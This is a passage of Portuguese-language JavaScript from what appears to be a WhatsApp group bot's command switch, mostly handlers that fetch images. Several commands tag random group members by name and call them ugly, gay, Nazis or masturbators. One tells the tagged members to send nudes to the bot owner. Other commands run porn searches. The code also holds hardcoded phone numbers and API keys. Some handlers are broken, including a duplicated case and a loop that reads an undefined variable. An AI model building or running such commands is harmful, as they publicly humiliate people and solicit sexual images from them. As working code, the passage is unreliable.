			    no = nobg.split("/")[0];

			    bg = nobg.split("/")[1];
			    reply(wait)
			    buffer = await getBuffer(`https://api.zeks.xyz/api/phub?apikey=apivinz&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${no}&msg=${bg}`, {method: 'get'})
			    Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '𝙿𝚁𝙾𝙽𝚃𝙸𝙽𝙷𝙾 𝙰𝙼𝙸𝙶𝙾 ✓*\n\nBy: junhin'})

					break                    
case 'pornhub':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(8)
					if (teks.length > 15) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo punheteiro...*')
					buffer = await getBuffer(`https://rsymenti.sirv.com/20210711_164511.jpg?text.0.text=${teks}&text.0.position.x=-36%25&text.0.position.y=-43%25&text.0.size=50&text.0.color=ffffff&text.0.font.family=Ropa%20Sans&text.0.background.opacity=85&text.0.outline.opacity=18`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'Tomar senpai'})
					break 
					

case 'bugreport':
const bug = body.slice(10)
 if (args.length > 300) return Pin.sendMessage(from, 'Máximo 300 caracteres', msgType.text, {quoted: mek})
var nomor = mek.participant
teks1 = ` [REPORT]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\nErro ou bug: ${bug}`
var options = {
 text: teks1, 
contextInfo: {mentionedJid: [sender]}, 
}
Pin.sendMessage('557187566648@s.whatsapp.net', options, text, {quoted: mek})
reply("Mensagem enviada ao meu dono; Spam = block + ban.")
break
case 'belle':                 
				 data = fs.readFileSync('./src/belle.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                Pin.sendMessage(from, hasil, image, { caption: 'c bate pra essa mina da pqpkkkk',quoted: mek})
				break
case '%feio':

	            	if (args.length < 1) return reply('marque alguem fei que doi!')
					rate = body.slice(6)
					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					var kl = ti[Math.floor(Math.random() * ti.length)]
					Pin.sendMessage(from, 'Como você é feio: *'+rate+'*\n\nSua porcentagem de feiura é : '+ kl+'%\n parece um sarigue kkk', text, { quoted: mek })
					break
case '%':
				algo = body.slice(2)
				pessoa = body.slice(1)
Pin.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
porcentagem = random
if (porcentagem < 20 ) {frase = 'Você não é😔'} else if (porcentagem == 21 ) {frase = '+/- ${algo}'} else if (porcentagem == 23 ) {frase = '+/- ${algo}'} else if (porcentagem == 24 ) {frase = '+/- ${algo}'} else if (porcentagem == 25 ) {frase = '+/- ${algo}'} else if (porcentagem == 26 ) {frase = '+/- ${algo}'} else if (porcentagem == 27 ) {frase = '+/- ${algo}'} else if (porcentagem == 28 ) {frase = '+/- ${algo}'} else if (porcentagem == 29 ) {frase = '+/- ${algo}'} else if (porcentagem == 30 ) {frase = '+/- ${algo}'} else if (porcentagem == 31 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 32 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 33 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 34 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 35 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 36 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 37 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 38 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 39 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 40 ) {frase = 'Talvez seja em...😑'} else if (porcentagem == 41 ) {frase = 'É sim em...'} else if (porcentagem == 42 ) {frase = 'É sim em...'} else if (porcentagem == 43 ) {frase = 'É sim em...'} else if (porcentagem == 44 ) {frase = 'É sim em...'} else if (porcentagem == 45 ) {frase = 'É sim em...'} else if (porcentagem == 46 ) {frase = 'É sim em...'} else if (porcentagem == 47 ) {frase = 'É sim em...'} else if (porcentagem == 48 ) {frase = 'É sim em...'} else if (porcentagem == 49 ) {frase = 'É sim em...'} else if (porcentagem == 50 ) {frase = '50% agora pra saber só ele dizendo🧐'} else if (porcentagem > 51) {frase = 'você é concerteza🙈'
}
result = `${pessoa} Você é ${random}% ${algo}\n\n${frase}`
reply(result)
break					
case '%lindo':		
	            	if (args.length < 1) return reply('marque alguem bonito!')
					rate = body.slice(8)
					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					var kl = ti[Math.floor(Math.random() * ti.length)]
					Pin.sendMessage(from, 'Como você é lindo: *'+rate+'*\n\nSua porcentagem de Lindeza é : '+ kl+'%\n parece um boleto pago kkk', text, { quoted: mek })
					break
case '%gostoso':		
	            	if (args.length < 1) return reply('marque sua mãe aquela gostosa!')
					rate = body.slice(9)
					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					var kl = ti[Math.floor(Math.random() * ti.length)]
					Pin.sendMessage(from, 'tu e gostoso(a) será?: *'+rate+'*\n\nSua porcentagem de gostoso é : '+ kl+'%🤤\n slk comia ate o pau mofar🌚 kkk', text, { quoted: mek })
					break
case '%gado':		
	            	if (args.length < 1) return reply('marque um gado!')
					rate = body.slice(6)
					var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					var kl = ti[Math.floor(Math.random() * ti.length)]
					Pin.sendMessage(from, 'tu e gado(a) será?: *'+rate+'*\n\nSua porcentagem de gado é : '+ kl+'%😏\n maluco falta comer um buraco na parede kkk', text, { quoted: mek })
					break
case 'rankcacos':
try{
if(!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
d = []
teks = '🐒 Rank dos camacos\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍🐒❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankgays':
try{
if(!isGroup) return reply(mess.only.group)
d = []
teks = '🏳️‍🌈 Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🏳️‍🌈❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'ranklindos':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '🤩Rank dos mais lindos \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤩❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'ranklindas':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '🤩Rank das mais lindas \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤩❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'ranknazistas':
try{
if(!isGroup) return reply(mess.only.group)
d = []
teks = '💂‍♂️Rank dos mais nazistas\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `💂‍♂️❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankgostosos':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '😏Rank dos mais gostosos\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `😏❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankgostosas':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '😏Rank das mais gostosas\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `😏❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankgados':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '🐃Rank dos mais gados\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🐃❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankfeios':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '"🤓Rank dos mais feios \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤓❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'rankfeias':
try{
if(!isGroup) return (mess.only.group)
d = []
teks = '"😔Rank das mais feias \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `😔❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break
case 'pombinhos':
case 'casal':
					if (!isGroup) return reply(mess.only.group)
						membr = []
						const suamae11 = groupMembers
						const suamae21 = groupMembers
						const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
						const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
						var shipted1 = ["1%", `10%`, `20%`, `40%`, `50%`, `60%`, `80%`, `90%`, `100%`, `99999%`]
						const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
						teks = `*Hmmm.... Shippo os dois 💟💟*\n\n1= @${teupai11.jid.split('@')[0]}\ne esse\n2= @${teupai21.jid.split('@')[0]}\ncom uma porcentagem de: *${shipted}*`
						membr.push(teupai11.jid)
						membr.push(teupai21.jid)
						mentions(teks, membr, true)
					break
case 'gostosas':
      if (!isGroup) return reply(mess.only.group)
                        member = []
                        const p1 = groupMembers
                        const p2 = groupMembers
                        const p3 = groupMembers
                        const p4 = groupMembers
                        const p5 = groupMembers
                        const o1 = p1[Math.floor(Math.random() * p1.length)]
                        const o2 = p2[Math.floor(Math.random() * p2.length)]
                        const o3 = p3[Math.floor(Math.random() * p3.length)]
                        const o4 = p4[Math.floor(Math.random() * p4.length)]
                        const o5 = p5[Math.floor(Math.random() * p5.length)]
                        teks = `
                  Paradas!🤚🤚\n\n1=🤚🤭@${o1.jid.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o2.jid.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o3.jid.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o4.jid.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o5.jid.split('@')[0]}🤚🤭\n\n\nMultas por serem gostosas dms😳 pague pena enviando nud no PV do dono😊 by Junhin`
                        member.push(o1.jid)
                        member.push(o2.jid)
                        member.push(o3.jid)
                        member.push(o4.jid)
                        member.push(o5.jid)
                        mentions(teks, member, true)
                                        break 
case 'punheteros':
      if (!isGroup) return reply(mess.only.group)
                        member = []
                        const a1 = groupMembers
                        const a2 = groupMembers
                        const a3 = groupMembers
                        const a4 = groupMembers
                        const a5 = groupMembers
                        const b1 = a1[Math.floor(Math.random() * a1.length)]
                        const b2 = a2[Math.floor(Math.random() * a2.length)]
                        const b3 = a3[Math.floor(Math.random() * a3.length)]
                        const b4 = a4[Math.floor(Math.random() * a4.length)]
                        const b5 = a5[Math.floor(Math.random() * a5.length)]
                        teks = `
                  Parados!✊✊\n\n1=✊🧐@${b1.jid.split('@')[0]}✊🧐\n\n\n2=✊🧐@${b2.jid.split('@')[0]}✊🧐\n\n\n3=✊🧐@${b3.jid.split('@')[0]}✊🧐\n\n\n4=✊🧐@${b4.jid.split('@')[0]}✊🧐\n\n\n5=✊🧐@${b5.jid.split('@')[0]}✊🧐\n\n\nSlc esses ai pintaram a parede de branco kkkkk😳 para de bater mlks`
                        member.push(b1.jid)
                        member.push(b2.jid)
                        member.push(b3.jid)
                        member.push(b4.jid)
                        member.push(b5.jid)
                        mentions(teks, member, true)
                                        break                                         
case 'rr':
                    rate = body.slice(1)
                    ratee = ["Tac... Não disparou","Tac... Não disparou,ainda...","Tac💥 Disparou e você morreu","Tac💥Disparou mas a bala pegou de raspão","A arma falhou","Tac... Por pouco que não dispara...","Tac... A arma estava descarregada"]
                    const cu = ratee[Math.floor(Math.random() * ratee.length)]
                    Pin.sendMessage(from, ''+ cu+'', text, { quoted: mek })
                    break
case 'cassino':
const cassino = ['ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 2 ─═─ 3*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 3 ─═─ 1*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 2 ─═─ 1*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 3 ─═─ 2*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 1 ─═─ 3*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 1 ─═─ 2*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 1 ─═─ 1*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 2 ─═─ 2*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 3 ─═─ 3*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*']
					random = cassino[Math.floor(Math.random() * (cassino.length))]
					reply(`${random}`)
					break

                    
					
case 'rola':
case 'pau':
                const pika=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26]
				const tamanhoo = pika[Math.floor(Math.random() * pika.length)]
				
				 data = fs.readFileSync('./src/pau.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)
                if (tamanhoo < 13 ) {pp = 'só a fimose'} else if (tamanhoo == 13 ) {pp = 'passou da média😳'} else if (tamanhoo == 14 ) {pp = 'passou da média😳'} else if (tamanhoo == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanhoo == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanhoo == 17 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanhoo == 18 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanhoo == 19 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanhoo == 20 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanhoo == 21 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanhoo == 22 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanhoo == 23 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanhoo == 24 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanhoo > 25 ) {pp = 'vai procurar petróleo com isso?'
}               
                piroca = `Seu pau tem ${tamanhoo}cm *${pp}*`
                Pin.sendMessage(from, buffer, image, {quoted: mek, caption: piroca,})
				break
				
				






case 'listonline':

        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from

			    let online = [...Object.keys(Pin.chats.get(ido).presences), Pin.user.jid]

			    Pin.sendMessage(from, '𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐂𝐓𝐓𝐒 𝐃𝐎 𝐁𝐎𝐓 𝐎𝐍𝐋𝐈𝐍𝐄:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: mek,

  			  contextInfo: { mentionedJid: online }

			    })

				break









//--Pinterest wallpaper

  case 'wp':

case 'wallpaper':

  if (!isRegister) return reply(mess.only.daftarB)

  

  Pin.updatePresence(from, Presence.composing)

  pw = ["wallpaper aestethic",

"wallpaper tumblr",

"wallpaper lucu",

"wallpaper"]

  nk = pw[Math.floor(Math.random() * pw.length)]

  try {

  data = await fetchJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {

method: 'get'

  })

  reply(mess.wait)

  n = JSON.parse(JSON.stringify(data));

  nimek = n[Math.floor(Math.random() * n.length)];

  pok = await getBuffer(nimek)

  Pin.sendMessage(from, pok, image, {

quoted: mek, caption: `NUM E LEGAL KKK`

  })

  

  } catch {

    reply(mess.ferr)

  }

  break





//--link wame

case 'wa.me':

case 'wame':

  Pin.updatePresence(from, Presence.composing)

  options = {

text: `link whatsapp : *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,

contextInfo: {

  mentionedJid: [sender]

}

  }

  Pin.sendMessage(from, options, text, {

quoted: mek

  })

  break




//--notificação grupo

  
  case 'notificar':


if (!isGroupAdmins) return reply(mess.only.admin)


Pin.updatePresence(from, Presence.composing)

if (!isRegister) return reply(mess.only.daftarB)

if (!isGroup) return reply(mess.only.group)

teks = `Notif de @${sender.split("@")[0]}\n*Pesan : ${body.slice(11)}*`

group = await Pin.groupMetadata(from);

member = group['participants']

jids = [];

member.map(async adm => {

  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));

})

options = {

  text: teks,

  contextInfo: {

mentionedJid: jids

  },

  quoted: mek

}

await Pin.sendMessage(from, options, text)

break






case 'info':

  if (!isRegister) return reply(mess.only.daftarB)

  try {

ppimg = await Pin.getProfilePicture(`https://i.ibb.co/Vx5HCrP/IMG-20210331-WA0012.jpg`)

  } catch {

ppimg = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSygUysQQ0ZMGAoqmEVT-AeTGAmcU5wwFlpyQ&usqp=CAU'

  }

  teks = `
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ 𝐍𝐎𝐌𝐄 𝐃𝐎 𝐁𝐎𝐓* : BOT DO JUNHIN
┗━━━━━━━━━━━━━━━━━━━
              usuario 👇
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️‣ 𝐔𝐒𝐔𝐀𝐑𝐈𝐎 𝐓𝐎𝐓𝐀𝐋* : ${_registered.length}
┗━━━━━━━━━━━━━━━━━━━
             chat bot 👇
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ 𝐓𝐎𝐓𝐀𝐋 𝐂𝐇𝐀𝐓 𝐃𝐎 𝐁𝐎𝐓* : ${totalchat.length}
┗━━━━━━━━━━━━━━━━━━━
              seu link 👇
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷️ 𝐓𝐄𝐔 𝐋𝐈𝐍𝐊 : wa.me/${sender.split("@")[0]}
┗━━━━━━━━━━━━━━━━━━━
                 ativo 👇
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷ 𝐁𝐎𝐓 𝐅𝐎𝐈 𝐀𝐓𝐈𝐕𝐎 𝐀𝐒 : 12:00 𝐃𝐀 𝐍𝐎𝐈𝐓𝐄
┗━━━━━━━━━━━━━━━━━━━
      meu pix 
┏━━━━━━━━━━━━━━━━━━━
 ┠⊷ 𝐀𝐉𝐔𝐃𝐀 𝐋𝐀  
 ┠⊷ 55 71 9258-3596
┗━━━━━━━━━━━━━━━━━━━`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

  

  break



 

  case 'trocanome':
  case 'setname':

if (!isGroup) return reply(mess.only.group)

if (!isGroupAdmins) return reply(mess.only.admin)

if (!isBotGroupAdmins) return reply(mess.only.Badmin)

let idgrup = `${from.split("@s.whatsapp.net")[0]}`;

Pin.groupUpdateSubject(idgrup, `${body.slice(9)}`)

Pin.sendMessage(from, '*☉* Renomeando o Grupo', text, {

  quoted: mek

})

break




   
  case 'trocadescrisao':
  case 'setdesk':

if (!isGroup) return reply(mess.only.group)

if (!isGroupAdmins) return reply(mess.only.admin)

if (!isBotGroupAdmins) return reply(mess.only.Badmin)

Pin.groupUpdateDescription(from, `${body.slice(9)}`)

Pin.sendMessage(from, '* ☉ * Altera a descrição do grupo', text, {

  quoted: mek

})

break







//--random meme

case 'meme':
					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=MEME BRASIL`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					Pin.sendMessage(from, nye, image, { caption: 'cringe️', quoted: mek })
					await limitAdd(sender) 	
					break
					
					
					
					
case 'editanime1':
case 'animeedit':
case 'animedit':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=editanime`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'oia q edit top lhek :)', quoted: mek })
					await limitAdd(sender)
					break
					
					
					
					
case 'overhaul':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=overhaul`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'o vilão favorito de junhin :)', quoted: mek })
					await limitAdd(sender)
					break			
					
					
					
case 'randomhentai':
reply(mess.wait)
                play = body.slice(5)
                anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=BotWeA=${play}&apikey=apivinz`)
               if (anu.error) return reply(anu.error)
                 infomp3 = `*HENTAI N ENCONTRADA!!!*\nTítulo : ${anu.result.title}\nUrl : ${anu.result.source}\nTamanho : ${anu.result.size}\n\n*ESPERE UM POUQUINHO, N SPAME O CHAT*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_image)
                Pin.sendMessage(from, buffer, image, { quoted: mek})
                await limitAdd(sender)
                break                                      
 case 'goku':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=goku`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'goku!!', quoted: mek })
					await limitAdd(sender)
					break
					
					                                 
                                              
case 'levi':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=levi`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'levi!!', quoted: mek })
					await limitAdd(sender)
					break
						
						
						
						
case 'naruto':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=naruto`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					await limitAdd(sender)
					break						
						
						
						
case 'allmight':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=allmight`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'esse é verdadeiro heroi número 1!!', quoted: mek })
					await limitAdd(sender)
					break									
					
case 'pornhub':
			   if (isBanned) return reply(mess.only.benned)    
			   if (!isUser) return reply(mess.only.userB)
			   				
              	    if (args.length < 1) return reply('teksnya mana gan?')
                    teks = body.slice(9)
                    anu = await fetchJson(`https://api.arugaz.my.id/api/media/pornhub/search?query=${teks}`, {method: 'get'})
                    teks = `===============\n`
                    for (let p of anu.result) {
                    teks += `Title: ${bokep.title}\nAktor: ${bokep.author}\nViewers: *${bokep.views}*\nDurasi: ${bokep.duration}\nLink: ${bokep.link}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break
			     	
			     	
			     	
			     	
case 'xvideos':
			   if (isBanned) return reply(mess.only.benned)    
			   if (!isUser) return reply(mess.only.userB)
			   	
                    anu = await fetchJson(`https://api.arugaz.my.id/api/media/xvideo/search?query=${body.slice(9)}`, {method: 'get'})
                    teks = `===============\n`
                    for (let b of anu.result) {
                    teks += `• Title: ${b.title}\n• Info: ${b.info}\n• Link: ${b.link}\n===============\n`
                    }
                    reply(teks.trim())
			     	break
case 'neymar':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=neymar`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'menino ney!!', quoted: mek })
					await limitAdd(sender)
					break
					
case 'bolsonaro':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=bolsonaro`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'futuro zagueirão do vasco!', quoted: mek })
					await limitAdd(sender)
					break					
case 'meruem':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=meruem`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meruem!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'baki':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=baki`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'baki!', quoted: mek })
					await limitAdd(sender)
					break					
case 'kratos':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=kratos`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'kratos!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'pain':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=pain`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'sinta a verdadeira dor!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'kira':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=kira`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
